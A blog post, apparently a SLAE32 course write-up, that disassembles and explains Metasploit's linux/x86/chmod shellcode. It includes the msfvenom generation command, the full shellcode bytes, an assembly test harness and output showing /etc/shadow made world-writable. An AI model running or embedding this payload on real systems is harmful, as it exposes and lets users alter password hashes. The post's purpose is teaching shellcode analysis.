---
title: SLAE32 Assignment 5.2 -- Analyzing chmod Shellcode
date: 2019-9-15
layout: single
classes: wide
tags:
  - msfvenom
  - metasploit
  - chmod
  - assembly
  - SLAE
  - linux
  - x86
  - shellcode
--- 
![](/assets/images/SLAE32.png)
![](/pics/msfLogo.png)
## Overview
For the fifth assignment in the SLAE32 course we were tasked with analyzing three shellcodes from the Metasploit Framework.  
In this blog post we will be analyzing the `linux/x86/chmod` payload.  
This shellcode will change the permissions of the file `/etc/shadow` on the victims device allowing any and all users to read & write to the file.  
There are much easier ways of creating an executable to test the shellcode than what is shown here. Instead we could have used the C program provided, output the shellcode into a file, or piped the payload to the analysis program.  
The method of adding the shellcode to our own `JMP|Call|POP` Assembly program was used to gain a better grasp on the assembly concepts.  
### Settings for our MSF chmod payload
```console
root# msfvenom --payload linux/x86/chmod --list-options
Name  Current Setting  Required  Description
----  ---------------  --------  -----------
FILE  /etc/shadow      yes       Filename to chmod
MODE  0666             yes       File mode (octal)

Description:
  Runs chmod on specified file with specified mode
```

## Preparing the Shellcode for `gdb` & `disasm` Analysis
### Generating the `chmod` Shellcode
```console
root@zed# msfvenom -p linux/x86/chmod --format python 2>/dev/null | \
> egrep "^buf " | sed -e 's/buf /sc /g'
sc =  ""
sc += "\x99\x6a\x0f\x58\x52\xe8\x0c\x00\x00\x00\x2f\x65\x74"
sc += "\x63\x2f\x73\x68\x61\x64\x6f\x77\x00\x5b\x68\xb6\x01"
sc += "\x00\x00\x59\xcd\x80\x6a\x01\x58\xcd\x80"
```
+ We will export the shellcode to the python format.
  -  This will allow us to add the shellcode to our python script for formatting.
+ Once we generate the correct format for our shellcode, we will add it to our `JMP|Call|POP` assembly program.
  - This will allow us to easily analyze the shellcode with `gdb` and `disasm`.

### Formatting the Shellcode for Assembly Compilation
+ We will copy the `sc` python variable generated above, and add it to our python script.
+ Typically `msfvenom` generates the shellcode in the `\x99` we see above.
+ We need the shellcode to be in the `0x99,` format.
  - Assembly requires we use the `0x99,` format for assigning a hex string to memory.

#### Our Python Script to Format the Hex Code
```python
#!/usr/bin/python
# Filename: formatHex.py
# Author:   boku
# Purpose:  A python script that converts the '\x' format to '0x ,'

# Add the shellcode hex here.
sc =  ""
sc += "\x99\x6a\x0f\x58\x52\xe8\x0c\x00\x00\x00\x2f\x65\x74"
sc += "\x63\x2f\x73\x68\x61\x64\x6f\x77\x00\x5b\x68\xb6\x01"
sc += "\x00\x00\x59\xcd\x80\x6a\x01\x58\xcd\x80"

output = ""
print 'Encoded shellcode ...'
for x in bytearray(sc) :
        output += '0x'
        output += '%02x,' %x
print output
```

#### Generating the Hex in the `0x ,` Format

```console
root# python formatHex.py
Encoded shellcode ...
0x99,0x6a,0x0f,0x58,0x52,0xe8,0x0c,\
0x00,0x00,0x00,0x2f,0x65,0x74,0x63,0x2f,0x73,\
0x68,0x61,0x64,0x6f,0x77,0x00,0x5b,0x68,0xb6,\
0x01,0x00,0x00,0x59,0xcd,0x80,0x6a,0x01,0x58,\
0xcd,0x80
```
+ The `\<Return>` at the end was added after for formatting.
  - This format does work when compiling shellcode with `nasm`.
  - Nasm does not seem to care about `<space>` characters either.

### Adding the Shellcode to our `JMP|Call|POP` Assembly Program

```nasm
; Filename: jmpCallPop.nasm
; Author:  Bobby Cooke
global _start
section .text
_start:
; 1. Jump to where our Shellcode string is
  jmp short call_shellcode
decoder:
  pop esi
jmp2_shellcode:
; 3. Now that the memory location of our string is on the top of the
;     stack, we will pass control to it using the jmp instruction.
  pop eax
  jmp eax
call_shellcode:
; 2. Call to the instruction that will jump us into our Shellcode
;    - Call is like jump, but stores the memory location of the next
;       instruction onto the Stack; which is our Shellcode.
  call jmp2_shellcode
  shellcode: db 0x99,0x6a,0x0f,0x58,0x52,0xe8,0x0c,\
      0x00,0x00,0x00,0x2f,0x65,0x74,0x63,0x2f,0x73,\
      0x68,0x61,0x64,0x6f,0x77,0x00,0x5b,0x68,0xb6,\
      0x01,0x00,0x00,0x59,0xcd,0x80,0x6a,0x01,0x58,\
      0xcd,0x80
```
+ To get nasm syntax highlighting in Vim I used the command `:set syn=nasm`.

### Compiling our JMP|Call|POP Shellcode
```console
root# nasm -f elf32 jmpCallPop.nasm -o jmpCallPop.o
root# ld jmpCallPop.o -o jmpCallPop
```
### Testing our chmod Shellcode
```console
root# ls -l /etc/shadow
-rw-r----- 1 root shadow 1074 Sep  3 11:17 /etc/shadow
root# ./jmpCallPop
root# ls -l /etc/shadow
-rw-rw-rw- 1 root shadow 1074 Sep  3 11:17 /etc/shadow
```
+ The payload will change the file `/etc/shadow` to the permissions `rw-rw-rw-`.

Great! Our payload works as intended. Now lets set a breakpoint and analyze the shellcode with `gdb`.

## Disassembling the Shellcode with gdb
We will start the program with `gdb`, and set a breakpoint for our `shellcode`. Once control is passed to `shellcode` we will step through it in `gdb`.  

### Setting up gdb for analysis
#### Starting the Shellcode with gdb

```console
root# gdb ./jmpCallPop
```

#### Finding the Memory Location of our Shellcode
```console
gdb-peda$ info functions
All defined functions:
Non-debugging symbols:
0x08048060  _start
0x08048062  decoder
0x08048063  jmp2_shellcode
0x08048066  call_shellcode
0x0804806b  shellcode
```

#### Setting the Breakpoint in gdb
```console
gdb-peda$ b shellcode
Breakpoint 1 at 0x804806b
```
#### Running & Disassembling the Shellcode 
```console
gdb-peda$ run
gdb-peda$ disassemble $eip
Dump of assembler code for function shellcode:
=> 0x0804806b <+0>:     cdq
   0x0804806c <+1>:     push   0xf
   0x0804806e <+3>:     pop    eax
   0x0804806f <+4>:     push   edx
   0x08048070 <+5>:     call   0x8048081 <shellcode+22>
   0x08048075 <+10>:    das
   0x08048076 <+11>:    gs
   0x08048077 <+12>:    je     0x80480dc
   0x08048079 <+14>:    das
   0x0804807a <+15>:    jae    0x80480e4
   0x0804807c <+17>:    popa
   0x0804807d <+18>:    outs   dx,DWORD PTR fs:[esi]
   0x0804807f <+20>:    ja     0x8048081 <shellcode+22>
   0x08048081 <+22>:    pop    ebx
   0x08048082 <+23>:    push   0x1b6
   0x08048087 <+28>:    pop    ecx
   0x08048088 <+29>:    int    0x80
   0x0804808a <+31>:    push   0x1
   0x0804808c <+33>:    pop    eax
   0x0804808d <+34>:    int    0x80
End of assembler dump.
```
Great! Now we will break these instructions into systemcall sections and then disect them block by block.

## Dividing the Shellcode by Systemcalls
Since we know that the instruction `int 0x80` is used to execute linux systemcalls, we will use this knowlege to divid this shellcode into two sections.  
We also know that the value of the `eax` register controls which systemcall will be executed.  
+ Our first systemcall has the eax value of `0xf`.
+ Our second systemcall has the eax value of `0x1`.

### chmod() Systemcall Section
#### Finding the Systemcall in the Header File
```console
i /usr/include/i386-linux-gnu/asm/unistd_32.h
  #define __NR_chmod               15
```
+ The hex value `0xf` translates to `15` in decimal.

#### chmod() C Function
```console
root# man 2 chmod
  int chmod(const char *path, mode_t mode);
       EAX         EBX             ECX
```
+ The corresonding assembly register values have been tagged onto the C function.

## chmod() Broken Down by Blocks
### First Block 
```console
=> 0x0804806b <+0>:     cdq
   0x0804806c <+1>:     push   0xf
   0x0804806e <+3>:     pop    eax
   0x0804806f <+4>:     push   edx
```

1. Instruction `cdq` is used to clear out the `edx` register.
+ `cqd` - Covert Doubleword to Quadword
  - a Doubleword is 32 bits (one register)
  - a Quadword   is 64 bits (two registers)
  - if eax is a positive value, the edx will be clear - `edx: 0x00000000`
  - if eax is a negiative value, the edx will be full - `edx: 0xffffffff`
2. Instruction `push 0xf` pushes the byte `0xf` onto the top of the stack.
3. Instruction `pop eax` puts the value `0xf` into the `eax` register from the top of the `stack`.
+ `EAX: 0xf`
+ This is the `EAX` value for the `chmod` systemcall.
4. Instruction `push edx` pushes 4 bytes `0x00` (a dword) onto the top of the stack.
  
### Second Block
This block of code uses the `call` instruction to jump over the block shown here, and continue execution of the shellcode. 

```console
   0x08048070 <+5>:     call   0x8048081 <shellcode+22>
   0x08048075 <+10>:    das
   0x08048076 <+11>:    gs
   0x08048077 <+12>:    je     0x80480dc
   0x08048079 <+14>:    das
   0x0804807a <+15>:    jae    0x80480e4
   0x0804807c <+17>:    popa
   0x0804807d <+18>:    outs   dx,DWORD PTR fs:[esi]
   0x0804807f <+20>:    ja     0x8048081 <shellcode+22>
```
+ When the `call` instruction is executed, the memory location of the next instruction will be stored otno the top of the stack before maing the jump.
+ The memory location stored on the top of the stack is actually the address of our string used for the filename `/etc/shadow`.
  - Any time I see `das` after a call in shellcode, it typically means it is a string operation.

##### Pointer to /etc/shadow string on the top of the Stack
```console
[-------------------stack---------------------------]
0000| 0xbffff588 --> 0x8048074 (<shellcode+10>: das)
```

### Third Block
This block finishes setting up the registers and then executes the `chmod` systemcall.

```console
   0x08048081 <+22>:    pop    ebx
   0x08048082 <+23>:    push   0x1b6
   0x08048087 <+28>:    pop    ecx
   0x08048088 <+29>:    int    0x80
```


Looking back at our C `chmod()` function, and it's required arguments.
```c
  int chmod(const char *path, mode_t mode);
       EAX         EBX             ECX
```
+ `const char *path`
  - This means the `EBX` register will be a pointer to the memory location holding our string `/etc/shadow`.
+ `mode_t mode`
  - This meas the `ECX` register will hold the permissions we wish to change the file to.

Consulting the manual pages with `man 2 chmod`, we find the following for the `mode`.
```console
 The new file permissions are specified in mode, which is a bit mask  created  by  ORing
together zero or more of the following:
S_ISUID  (04000)  set-user-ID (set process effective user ID on execve(2))
S_ISGID  (02000)  set-group-ID  (set process effective group ID on execve(2); mandatory
                  locking, as described in fcntl(2); take a new file's group from  par‐
                  ent directory, as described in chown(2) and mkdir(2))
S_ISVTX  (01000)  sticky bit (restricted deletion flag, as described in unlink(2))
S_IRUSR  (00400)  read by owner
S_IWUSR  (00200)  write by owner
S_IXUSR  (00100)  execute/search  by owner ("search" applies for directories, and means
                  that entries within the directory can be accessed)
S_IRGRP  (00040)  read by group
S_IWGRP  (00020)  write by group
S_IXGRP  (00010)  execute/search by group
S_IROTH  (00004)  read by others
S_IWOTH  (00002)  write by others
S_IXOTH  (00001)  execute/search by others
```
+ The instruction `push  0x1b6` and `pop ecx` are used to fufill the `mode` arguement.  
+ Hex `1b6` translates to `666` in ocatal. This sets read(4) & write(2) permissions for user, group, and others.

### exit() Systemcall Section
+ Our second systemcall had the  hex value `0x1` in the `eax` register.
#### Finding the Systemcall in the Header File

```console
root# vi /usr/include/i386-linux-gnu/asm/unistd_32.h
      #define __NR_exit                 1
```
#### exit C Function
+ The corresonding assembly register values have been tagged onto the C function.

```console
 void _exit(int status);
       EAX     EBX
```
##### Exit Block
```console
   0x0804808a <+31>:    push   0x1
   0x0804808c <+33>:    pop    eax
   0x0804808d <+34>:    int    0x80
```
+ before the `exit` systemcall, its number `0x1` is popped into the `eax` register from the `stack`.
+ The value in the `ebx` register doesn't really matter since it is just the exit code number.
